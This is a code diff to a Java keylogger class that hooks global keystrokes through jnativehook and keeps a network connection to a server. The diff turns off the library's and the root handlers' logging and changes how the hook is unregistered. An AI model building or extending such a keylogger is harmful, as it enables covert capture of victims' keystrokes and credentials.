@@ -1,5 +1,9 @@
 package keylogger;
 
+import java.util.logging.Handler;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
 import network.Connection;
 import network.Message;
 import org.jnativehook.GlobalScreen;
@@ -20,9 +24,17 @@ public class KeyLogger implements NativeKeyListener {
         return instance;
     }
 
-    public KeyLogger(Connection c) {
+    private KeyLogger(Connection c) {
         this.server = c;
         instance = this;
+
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+
+        Handler[] handlers = Logger.getLogger("").getHandlers();
+        for(int i = 0; i < handlers.length; i++) {
+            handlers[i].setLevel(Level.OFF);
+        }
     }
 
     public void start() {
@@ -42,10 +54,10 @@ public class KeyLogger implements NativeKeyListener {
         if(isRunning) {
             try {
                 GlobalScreen.removeNativeKeyListener(instance);
-                GlobalScreen.unregisterNativeHook();
+//                GlobalScreen.unregisterNativeHook();
                 isRunning = false;
-            } catch(NativeHookException e) {
-                // Silence is golden
+            } catch(Exception e) {
+                e.printStackTrace();
             }
         }
     }
